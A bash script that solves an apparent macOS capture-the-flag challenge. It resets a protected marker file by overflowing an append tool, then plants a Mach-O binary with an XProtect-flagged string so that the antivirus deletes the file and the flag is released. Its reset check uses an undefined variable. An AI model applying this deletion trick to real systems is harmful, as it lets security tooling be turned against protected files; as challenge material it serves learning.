#!/bin/bash
#
#  Solution
#  --------
#  1. The "appender" binary appends data to the non-writable marker file.
#  2. There is a way to reset the file completely by exceeding its maximum delegated size (42 MBs).
#  3. By writing XProtect strings in a MACHo file and trying to execute it - file will be completely deleted.
#  4. Luckily, XProtect requires the file to also have the quarantine attribute, which it does have.
#  5. Since initially the file has non-MACHo contents - we must reset the file (by writing a lot of data) and then write a MACH-o file with that string.
#

# Fine tunables
MARKER_PATH=/private/var/tmp/marker/marker
TOOL_PATH=/Users/ctf/appender
MARKER_MAX_SIZE=100000

# Reset the file completely
python3 -c "print('A'*$MARKER_MAX_SIZE)" | $TOOL_PATH 2>/dev/null
if [ -s "$FILE" ]; then
    echo Marker file has not been reset
    exit 1
fi

# Compile a simple program with the incriminating string
rm -f ./trigger
rm -f ./trigger.c
cat << EOF > ./trigger.c
#include <stdio.h>
int main(void)
{
    printf("\nA7k9vQr5Z8d2fG3yLw4xM1sTj6Pq0nXz5Rj8uVw2YhK3eBq9FcLp1Dg7Hn0Zy6Xc4Tj8\n");
    return 0;
}
EOF
gcc -o ./trigger ./trigger.c
if [ ! -f "./trigger" ]; then
    echo Compilation error
fi

# Append to the marker file via the appender and delete leftovers
cat ./trigger | $TOOL_PATH
rm -f ./trigger
rm -f ./trigger.c

# Trigger XProtect
$MARKER_PATH

# Run the tool again to get the flag
echo JBO | $TOOL_PATH
